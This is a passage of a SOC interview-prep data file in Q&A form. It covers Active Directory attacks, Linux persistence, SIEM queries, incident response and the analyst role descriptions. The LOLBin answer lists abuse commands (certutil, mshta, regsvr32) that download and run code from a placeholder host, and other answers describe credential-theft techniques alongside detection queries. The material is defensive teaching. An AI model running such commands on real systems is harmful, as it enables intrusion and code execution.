    "answer": "<p>Any authenticated domain user can request a service ticket for any account with an <b>SPN</b>. That ticket is encrypted with the service account's password hash, so the attacker cracks it offline — no failed logons, no lockouts, no noise on the target.</p>\n <ul><li>4769 with <code>TicketEncryptionType 0x17</code> (RC4) when the domain uses AES — the downgrade is the tell.</li>\n <li>One account requesting many distinct SPNs in a short window.</li>\n <li>Honeypot SPN account nobody should ever request.</li></ul>\n <pre>SecurityEvent\n| where EventID == 4769 and TicketEncryptionType == \"0x17\"\n| where ServiceName !endswith \"$\"\n| summarize spns=dcount(ServiceName), make_set(ServiceName)\n    by Account, bin(TimeGenerated, 10m)\n| where spns >= 5</pre>"
  },
  {
    "level": "l2",
    "category": "Windows & AD",
    "question": "Pass-the-Hash vs Pass-the-Ticket?",
    "answer": "<p><b>PtH</b> — NTLM. Steal the hash from LSASS/SAM and authenticate with it directly; plaintext never needed. Shows as <b>4624 Type 3 with NTLM</b> from an unexpected source host.</p>\n <p><b>PtT</b> — Kerberos. Steal or forge a TGT/TGS and inject it. <b>Golden Ticket</b> = forged TGT signed with the krbtgt hash. <b>Silver Ticket</b> = forged TGS for one service, never touches the DC.</p>\n <p><b>Detection:</b> LSASS access by non-standard processes, NTLM where Kerberos is expected, 4769 with no preceding 4768, anomalous ticket lifetimes, admin logons from workstations.</p>"
  },
  {
    "level": "l3",
    "category": "Windows & AD",
    "question": "How would you hunt for DCSync activity?",
    "answer": "<p>DCSync abuses the replication API — with the right rights, an attacker asks a DC to hand over password hashes including krbtgt. No code runs on the DC, so file-based detection is blind.</p>\n <pre>// 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\n// 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\nSecurityEvent\n| where EventID == 4662\n| where Properties has \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\"\n     or Properties has \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n| where Account !endswith \"$\"\n| where Account !in (\"AAD_Sync\",\"MSOL_\")\n| project TimeGenerated, Computer, Account, SubjectLogonId</pre>\n <p>Corroborate with unexpected DRSUAPI traffic to a DC from a non-DC host. Any hit = domain compromise until disproven; krbtgt rotation (twice) follows.</p>"
  },
  {
    "level": "l1",
    "category": "Linux",
    "question": "Which Linux logs and locations matter?",
    "answer": "<pre>/var/log/auth.log | secure     auth, sudo, ssh\n/var/log/syslog   | messages   general\n/var/log/audit/audit.log       auditd, syscall level\n~/.bash_history                command history\n/var/log/cron                  scheduled jobs\n/var/log/wtmp,btmp,lastlog     login records (binary)\n/etc/passwd, /etc/shadow       account changes\n/etc/cron.*, /etc/systemd/     persistence\n~/.ssh/authorized_keys         backdoor keys</pre>\n <p>Commands: <code>last</code>, <code>lastb</code>, <code>ss -tulpn</code>, <code>ps auxf</code>, <code>crontab -l</code>, <code>systemctl list-timers</code>.</p>"
  },
  {
    "level": "l2",
    "category": "Linux",
    "question": "Where does a Linux attacker hide persistence?",
    "answer": "<ul><li><b>Cron</b> — user crontabs, <code>/etc/cron.d/</code>, <code>@reboot</code>.</li>\n <li><b>Systemd</b> — malicious <code>.service</code>/<code>.timer</code>, including user-level units.</li>\n <li><b>SSH</b> — appended authorized_keys, modified sshd_config, second sshd on a high port.</li>\n <li><b>Shell profiles</b> — <code>.bashrc</code>, <code>/etc/profile.d/</code>.</li>\n <li><b>LD_PRELOAD</b> / <code>/etc/ld.so.preload</code> — userland rootkit hooking.</li>\n <li><b>Kernel modules</b> — <code>lsmod</code> vs <code>/proc/modules</code> mismatch.</li>\n <li><b>SUID</b> — <code>find / -perm -4000 -type f</code> vs baseline.</li>\n <li><b>Accounts</b> — new UID 0 users, quiet sudo group additions.</li></ul>"
  },
  {
    "level": "l1",
    "category": "SIEM",
    "question": "What is a SIEM and what are its core functions?",
    "answer": "<ul><li><b>Collection</b> — agents, forwarders, syslog, API connectors.</li>\n <li><b>Normalisation</b> — vendor fields into a common schema (ASIM, CIM, ECS).</li>\n <li><b>Correlation</b> — rules linking events across sources into one alert.</li>\n <li><b>Alerting</b> — incident creation and queue routing.</li>\n <li><b>Retention and search</b> — historical hunting and compliance.</li>\n <li><b>Reporting</b> — metrics, coverage, compliance evidence.</li></ul>"
  },
  {
    "level": "l1",
    "category": "SIEM",
    "question": "True positive, false positive, benign true positive — the difference?",
    "answer": "<ul><li><b>TP</b> — fired and genuinely malicious. Escalate.</li>\n <li><b>FP</b> — fired but the activity did not occur as described, or the logic is wrong. Close and tune the logic.</li>\n <li><b>BTP</b> — the activity <i>did</i> happen exactly as described, but is authorised. Sysadmin running PsExec, a pentest, a scanner. Close benign and add a scoped exclusion.</li>\n <li><b>FN</b> — malicious activity with no alert. Most dangerous; found through hunting and post-incident review.</li></ul>\n <p>FP vs BTP matters because the fix differs: FP means change the logic, BTP means add a narrow exclusion.</p>"
  },
  {
    "level": "l2",
    "category": "SIEM",
    "question": "How do you tune a noisy rule without creating a blind spot?",
    "answer": "<ol><li><b>Quantify</b> — 30 days of firings grouped by user, host, process, parent.</li>\n <li><b>Root cause</b> — usually one service account, scanner, or backup job.</li>\n <li><b>Exclude narrowly</b> — the specific <i>combination</i>, never the whole account, host, or technique.</li>\n <li><b>Prefer thresholds/baselines</b> — alert on deviation from the account's own norm.</li>\n <li><b>Compensating logic</b> — a separate rule for when the excluded account acts outside its expected pattern.</li>\n <li><b>Version and document</b> — what, why, who approved, review date.</li>\n <li><b>Validate</b> — replay a known TP to prove the rule still fires.</li></ol>"
  },
  {
    "level": "l2",
    "category": "SIEM",
    "question": "Write a KQL query for brute force followed by a successful logon.",
    "answer": "<pre>let failThreshold = 15;\nlet window = 1h;\nlet failures = SecurityEvent\n| where TimeGenerated > ago(24h) and EventID == 4625\n| summarize failCount=count(), firstFail=min(TimeGenerated),\n            lastFail=max(TimeGenerated), srcIPs=make_set(IpAddress,10)\n    by TargetAccount = tolower(TargetUserName), Computer\n| where failCount >= failThreshold;\nSecurityEvent\n| where TimeGenerated > ago(24h) and EventID == 4624\n| where LogonType in (3, 10)\n| project sTime=TimeGenerated, TargetAccount=tolower(TargetUserName),\n          Computer, IpAddress, LogonType\n| join kind=inner failures on TargetAccount, Computer\n| where sTime between (firstFail .. (lastFail + window))\n| order by sTime desc</pre>\n <p>SPL equivalent:</p>\n <pre>index=wineventlog (EventCode=4625 OR EventCode=4624)\n| eval outcome=if(EventCode=4625,\"fail\",\"success\")\n| stats count(eval(outcome=\"fail\")) as fails,\n        count(eval(outcome=\"success\")) as wins,\n        values(src_ip) as srcs by user, host\n| where fails >= 15 AND wins > 0</pre>"
  },
  {
    "level": "l3",
    "category": "SIEM",
    "question": "Explain detection-as-code and how you would implement it.",
    "answer": "<p>Detection content treated as software: versioned, tested, reviewed, pipeline-deployed.</p>\n <ul><li><b>Source of truth</b> — rules in Git as Sigma or native format with ATT&CK mapping, severity, data sources, FP notes, owner.</li>\n <li><b>CI validation</b> — schema lint and query compilation on every PR.</li>\n <li><b>Unit testing</b> — replay known-malicious and known-benign samples; must fire on one, stay silent on the other.</li>\n <li><b>Peer review</b> — no silent tuning.</li>\n <li><b>Automated deployment</b> — API/Terraform push on merge.</li>\n <li><b>Continuous validation</b> — scheduled Atomic Red Team emulation confirms rules still fire in production.</li>\n <li><b>Coverage tracking</b> — MITRE heatmap generated from rule metadata.</li></ul>"
  },
  {
    "level": "l1",
    "category": "Incident Response",
    "question": "What are the phases of the incident response lifecycle?",
    "answer": "<p><b>NIST SP 800-61</b> — four phases:</p>\n <ol><li><b>Preparation</b> — tooling, logging, playbooks, training, contacts.</li>\n <li><b>Detection & Analysis</b> — identify, validate, scope, prioritise, document.</li>\n <li><b>Containment, Eradication & Recovery</b> — stop spread, remove foothold, restore and verify.</li>\n <li><b>Post-Incident Activity</b> — lessons learned, detection gaps, control changes.</li></ol>\n <p><b>SANS</b> splits into six (PICERL). Same flow — know which your organisation uses.</p>"
  },
  {
    "level": "l1",
    "category": "Incident Response",
    "question": "What belongs in a proper escalation to Tier 2?",
    "answer": "<ul><li><b>What fired</b> — rule name, severity, timestamp with timezone.</li>\n <li><b>Entities</b> — user, host, IPs, process, hash.</li>\n <li><b>What you checked</b> — reputation, prior alerts, process tree, whether the user is real and active.</li>\n <li><b>Why it looks real</b> — specific evidence, not a feeling.</li>\n <li><b>Scope so far</b> — one host or several.</li>\n <li><b>Actions taken</b> and who authorised them.</li>\n <li><b>Business context</b> — asset criticality, is the user privileged.</li>\n <li><b>Open questions</b> — what you could not determine and why.</li></ul>\n <p>A bad escalation says \"suspicious, please check.\" A good one lets L2 start investigating in the first minute.</p>"
  },
  {
    "level": "l2",
    "category": "Incident Response",
    "question": "Isolate the machine or leave it running?",
    "answer": "<p>Trade-off between <b>stopping damage</b> and <b>preserving intelligence</b>.</p>\n <p><b>Isolate immediately when:</b> encryption is active or imminent, exfiltration is observed, the host is spreading laterally, it is a DC or crown-jewel system, or the attacker is interactive.</p>\n <p><b>Consider monitoring when:</b> activity is contained and low-risk, you need full scope before tipping them off, or business impact of isolation exceeds the risk.</p>\n <p><b>Practically:</b> use EDR network isolation, not a cable pull — keeps the management channel for memory collection. Capture volatile data <i>before</i> containment where time allows. Never power off a live compromised host; you lose memory and often the encryption keys. Document the call with the incident commander.</p>"
  },
  {
    "level": "l2",
    "category": "Incident Response",
    "question": "What is the order of volatility?",
    "answer": "<ol><li>CPU registers and cache</li><li>Routing table, ARP cache, process table, RAM</li>\n <li>Temporary file systems and swap</li><li>Disk — file system, unallocated, slack</li>\n <li>Remote logs already shipped off-host</li><li>Physical configuration, network topology</li>\n <li>Archival media and backups</li></ol>\n <p>Alongside: maintain <b>chain of custody</b>, hash on acquisition, work on copies, never analyse the original.</p>"
  },
  {
    "level": "l3",
    "category": "Incident Response",
    "question": "You are IC on a ransomware incident. First two hours?",
    "answer": "<p><b>0–15 min — command.</b> Declare, open bridge, assign IC / technical lead / comms / scribe. Confirm scope. Verify SOC tooling and identity plane are not compromised.</p>\n <p><b>15–45 min — contain.</b> Isolate encrypted hosts. Block C2 and deployment mechanism. If spread is GPO/SCCM/RMM, cut that channel first — highest leverage. Protect backups: verify offline/immutable, take backup infra off-domain.</p>\n <p><b>45–90 min — scope.</b> Patient zero, initial access, dwell time. <b>Assume exfil preceded encryption</b> — check outbound transfers in preceding days. Find the persistence left for re-entry.</p>\n <p><b>90–120 min — escalate.</b> Executives, Legal, cyber insurance (insurers mandate early notification and often direct response). Assess regulatory obligations. Recovery planning with a <b>clean-build requirement</b> — restoring into a compromised domain restarts the clock.</p>\n <p>Throughout: scribe keeps a timestamped decision log. It becomes the report, the insurance submission, and the regulatory evidence.</p>"
  },
  {
    "level": "l1",
    "category": "Malware & EDR",
    "question": "Virus, worm, trojan, ransomware — the differences?",
    "answer": "<ul><li><b>Virus</b> — attaches to a host file, needs user execution.</li>\n <li><b>Worm</b> — self-propagating, no user action (WannaCry via SMB).</li>\n <li><b>Trojan</b> — disguised as legitimate; the user installs it.</li>\n <li><b>Ransomware</b> — encrypts and extorts. Modern variants use <b>double extortion</b>: exfiltrate, encrypt, threaten to publish.</li>\n <li><b>RAT</b> — interactive remote control.</li>\n <li><b>Rootkit</b> — hides its own presence, often kernel level.</li>\n <li><b>Fileless</b> — memory-only, abuses native tools.</li></ul>"
  },
  {
    "level": "l1",
    "category": "Malware & EDR",
    "question": "What is a process tree and why do you always check it?",
    "answer": "<p>Malicious execution almost always produces an <b>abnormal parent</b>, and that is faster to spot than analysing the payload.</p>\n <pre>WINWORD.EXE  → cmd.exe → powershell.exe   macro dropper\noutlook.exe  → wscript.exe                 attachment execution\nw3wp.exe     → cmd.exe                     webshell on IIS\nservices.exe → unsigned binary in %TEMP%   malicious service\nexplorer.exe → rundll32.exe (odd args)     DLL sideloading\nlsass.exe    accessed by non-system proc   credential dumping</pre>\n <p>Also check: signed? where on disk? what command line? what did it spawn next?</p>"
  },
  {
    "level": "l2",
    "category": "Malware & EDR",
    "question": "What is LOLBin abuse and how do you detect it?",
    "answer": "<p>Signed Microsoft-shipped executables abused to download, execute, or bypass controls. Allowlisting and signature AV do not stop them.</p>\n <pre>certutil.exe  -urlcache -f http://x/a.exe   download\nbitsadmin.exe /transfer                     download\nmshta.exe     http://x/a.hta                remote execution\nregsvr32.exe  /s /u /i:http://x/a.sct       AppLocker bypass\nrundll32.exe  javascript:...                script execution\nmsbuild.exe   inline C# task                compile-and-run\nwmic.exe      process call create           remote execution</pre>\n <p>Detection hinges on <b>arguments and context</b>, not binary name. Baseline what these look like normally, alert on the deltas. LOLBAS is the reference list.</p>"
  },
  {
    "level": "l2",
    "category": "Cloud",
    "question": "What cloud log sources does a SOC need?",
    "answer": "<p><b>Azure / M365</b></p>\n <ul><li><code>SigninLogs</code> / <code>AADNonInteractiveUserSignInLogs</code> — identity, the primary attack surface.</li>\n <li><code>AuditLogs</code> — directory changes: roles, apps, consent grants.</li>\n <li><code>AzureActivity</code> — control-plane operations.</li>\n <li><code>OfficeActivity</code> — Exchange, SharePoint, Teams. Inbox rules and mass downloads live here.</li></ul>\n <p><b>AWS</b></p>\n <ul><li><b>CloudTrail</b> — every API call. The most important AWS log.</li>\n <li><b>VPC Flow Logs</b>, <b>GuardDuty</b>, <b>S3 access logs</b>.</li></ul>\n <p>The recurring gap: control-plane logging enabled but <b>data-plane logging not</b> — you see the bucket policy change but not the objects read.</p>"
  },
  {
    "level": "l2",
    "category": "Cloud",
    "question": "How do you investigate a suspicious Azure AD sign-in?",
    "answer": "<pre>SigninLogs\n| where UserPrincipalName == \"user@corp.com\"\n| extend City=tostring(LocationDetails.city),\n         Country=tostring(LocationDetails.countryOrRegion)\n| project TimeGenerated, AppDisplayName, IPAddress, City, Country,\n          ResultType, UserAgent, RiskLevelDuringSignIn,\n          AuthenticationRequirement, ConditionalAccessStatus\n| order by TimeGenerated desc</pre>\n <p><b>Looking for:</b> impossible travel, hosting/VPN ASN rather than residential ISP, legacy auth (bypasses MFA), ResultType 50126 spray patterns, MFA satisfied without a prompt (token replay), first-ever sign-in from that device.</p>\n <p><b>Always check the aftermath:</b> new inbox rules, MFA method registration, OAuth consent grants, mass file access. Attackers rarely stop at the login.</p>"
  },
  {
    "level": "l1",
    "category": "Frameworks",
    "question": "What is MITRE ATT&CK and how do you use it day to day?",
    "answer": "<p>Knowledge base of adversary <b>tactics</b> (the why — 14), <b>techniques</b> (the how), <b>procedures</b> (specific implementations).</p>\n <ul><li>Tag every alert and detection with a technique ID so coverage is measurable.</li>\n <li>During investigation, predict the next step: found credential access → go look for lateral movement.</li>\n <li>Build a coverage heatmap to show gaps with evidence instead of assertion.</li>\n <li>Drive purple team exercises against specific techniques.</li></ul>"
  },
  {
    "level": "l1",
    "category": "Frameworks",
    "question": "Cyber Kill Chain vs ATT&CK?",
    "answer": "<p><b>Kill Chain</b> — seven linear stages: Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.</p>\n <p><b>Difference:</b> the Kill Chain is a linear high-level narrative, good for explaining an intrusion to non-technical stakeholders and arguing where to break the chain. ATT&CK is a non-linear granular matrix — adversaries loop back, skip stages, run techniques in parallel. Use the Kill Chain to communicate; ATT&CK to detect and measure.</p>"
  },
  {
    "level": "l2",
    "category": "Frameworks",
    "question": "Explain the Pyramid of Pain.",
    "answer": "<pre>       ▲  TTPs                  ← Tough!\n      ╱ ╲  Tools                 ← Challenging\n     ╱   ╲ Network/Host Artifacts ← Annoying\n    ╱     ╲ Domain Names          ← Simple\n   ╱       ╲ IP Addresses         ← Easy\n  ╱_________╲ Hash Values         ← Trivial</pre>\n <p>Higher = costlier to evade. A hash block costs one recompile. An IP block costs one VPS. Detecting a <b>behaviour</b> forces tradecraft redesign.</p>\n <p>Hash/IP blocks are still worth doing because they are cheap, but they are not a strategy. Detection engineering effort belongs at the top, and coverage is measured in techniques, not IOCs ingested.</p>"
  },
  {
    "level": "l1",
    "category": "Process",
    "question": "How do you prioritise when twenty alerts land at once?",
    "answer": "<p><b>Impact × confidence × urgency</b> — not arrival order, not what is easiest.</p>\n <ul><li><b>Asset criticality</b> — DC, finance system, executive endpoint outrank a lab VM.</li>\n <li><b>Stage of attack</b> — execution, credential access, or exfil beats recon.</li>\n <li><b>Blast radius</b> — admin account or shared server affects more.</li>\n <li><b>Alert fidelity</b> — a rule with a good track record deserves more weight.</li>\n <li><b>Clustering</b> — twenty alerts on one host is one incident, not twenty.</li></ul>\n <p>And say it: if the queue is genuinely beyond one person, escalate for help rather than silently letting SLAs slip.</p>"
  },
  {
    "level": "l2",
    "category": "Process",
    "question": "You closed an alert as FP and it was a real breach. What do you do?",
    "answer": "<p><b>Say it immediately.</b> The worst answer is anything sounding like concealment or delay.</p>\n <ol><li>Escalate with the original ticket, your reasoning, and what you now know.</li>\n <li>Reopen and re-scope from the <b>original timestamp</b> — dwell time starts there.</li>\n <li>Contribute to the timeline honestly; your notes are evidence.</li>\n <li>In the review, focus on <b>why the decision looked correct</b> — missing context, unclear playbook, absent log source.</li>\n <li>Propose the concrete control change.</li></ol>\n <p>Mature SOCs treat this as a process failure, not an individual one. The interviewer is testing integrity and whether you think in systems.</p>"
  },
  {
    "level": "l3",
    "category": "Process",
    "question": "How do you measure whether a SOC is actually effective?",
    "answer": "<p>Volume metrics measure activity, not effectiveness. Better:</p>\n <ul><li><b>MTTD / MTTR</b> — trended and broken down by incident class.</li>\n <li><b>Dwell time</b> — compromise to detection. The metric that matters most and is hardest to compute honestly.</li>\n <li><b>Detection coverage</b> — validated by emulation, not claimed from metadata.</li>\n <li><b>TP rate per rule</b> — which detections earn their keep.</li>\n <li><b>Escalation accuracy</b> — how often L1 escalations are genuine.</li>\n <li><b>Hunt yield</b> — findings no alert produced, i.e. measured false negatives.</li>\n <li><b>Log source health</b> — silent sources are invisible blind spots.</li>\n <li><b>Analyst attrition and alert fatigue</b> — leading indicator of collapse.</li></ul>"
  },
  {
    "level": "l1",
    "category": "Process",
    "question": "Why do you want to work in a SOC?",
    "answer": "<p>Answer with something specific and verifiable, not \"I'm passionate about security.\" Name a concrete thing: a home lab and what you detected in it, a CTF, a detection you wrote, a real incident, a certification and what it actually taught you.</p>\n <p>Then connect it to what the job is: methodical investigation under time pressure, comfort with ambiguity, discipline to document. Interviewers are screening for whether you understand the work is largely repetitive triage punctuated by real incidents.</p>"
  }
];

export const ROLES: Role[] = [
  {
    "level": "l1",
    "title": "Alert Triage Analyst",
    "range": "Entry · 0–2 yrs · shift-based, queue-driven",
    "items": [
      "<b>Monitor the alert queue</b> in SIEM/EDR (Sentinel, Splunk, QRadar, Defender XDR, CrowdStrike) across assigned shifts.",
      "<b>First-pass triage</b> — classify true positive, false positive, benign true positive, or duplicate.",
      "<b>Enrich alerts</b> with context: user, host, geo, asset criticality, reputation lookups (VirusTotal, AbuseIPDB, URLScan).",
      "<b>Follow playbooks exactly</b>; escalate anything outside documented steps.",
      "<b>Escalate to Tier 2</b> with a complete handoff: what fired, what was checked, why it looks real.",
      "<b>Document every action</b> in the case with timestamps.",
      "<b>Basic containment</b> where authorised — isolate host, disable account, block hash/IP.",
      "<b>Report health issues</b> — silent log source, offline agent, failed connector.",
      "<b>Shift handover</b> — pass open incidents to the next shift."
    ],
    "kpi": "MEASURED ON: MTTA · TRIAGE ACCURACY · ESCALATION QUALITY · SLA"
  },
  {
    "level": "l2",
    "title": "Incident Responder",
    "range": "Mid · 2–5 yrs · investigation and containment owner",
    "items": [
      "<b>Own escalated incidents</b> end to end — deep investigation, scope, root cause, closure.",
      "<b>Deep-dive analysis</b> correlating EDR, proxy, firewall, DNS, identity, and email telemetry.",
      "<b>Write and tune queries</b> in KQL/SPL to pivot beyond what the alert shows.",
      "<b>Determine blast radius</b> — what else the user/host/IP touched, and when it started.",
      "<b>Execute containment and eradication</b> — isolation, credential reset, mailbox purge, IOC blocking.",
      "<b>Malware triage</b> — static analysis, sandbox detonation, IOC extraction.",
      "<b>Map to MITRE ATT&CK</b> and drive detection improvements from what was missed.",
      "<b>Tune detections</b> — cut false positives, close gaps, propose new rules.",
      "<b>Mentor Tier 1</b>, review escalations, improve playbooks from real cases.",
      "<b>Coordinate with IT and app owners</b> during containment and recovery.",
      "<b>Produce incident reports</b> with timeline, impact, and remediation."
    ],
    "kpi": "MEASURED ON: MTTR · CONTAINMENT ACCURACY · TUNING IMPACT · REPORT QUALITY"
  },
  {
    "level": "l3",
    "title": "Threat Hunter / SOC Lead",
    "range": "Senior · 5+ yrs · proactive, engineering-heavy, advisory",
    "items": [
      "<b>Proactive threat hunting</b> on hypotheses, not alerts — assume compromise and go looking.",
      "<b>Lead major incidents</b> — ransomware, APT, insider, large-scale BEC; run the incident bridge.",
      "<b>Advanced forensics</b> — memory (Volatility), disk, timeline reconstruction, cloud forensics.",
      "<b>Reverse engineer malware</b>; produce custom signatures (YARA, Sigma, Suricata).",
      "<b>Detection engineering</b> — build, validate, and version-control detection content.",
      "<b>Threat intelligence integration</b> — translate actor TTPs into detections and hunts.",
      "<b>Purple teaming</b> — validate coverage with adversary emulation, close the gaps found.",
      "<b>SOAR automation</b> — design automated enrichment, triage, and response playbooks.",
      "<b>Architecture and tooling</b> — log source strategy, retention, SIEM cost/coverage balance.",
      "<b>Own the SOC maturity roadmap</b> — coverage metrics, MITRE heatmaps, capability gaps.",
      "<b>Executive reporting</b>; post-incident reviews and root-cause remediation ownership."
    ],
    "kpi": "MEASURED ON: DETECTION COVERAGE · HUNT FINDINGS · DWELL TIME · MATURITY"
  }
];

export const RESOURCE_COUNT = RESOURCES.reduce((a, g) => a + g.items.length, 0);
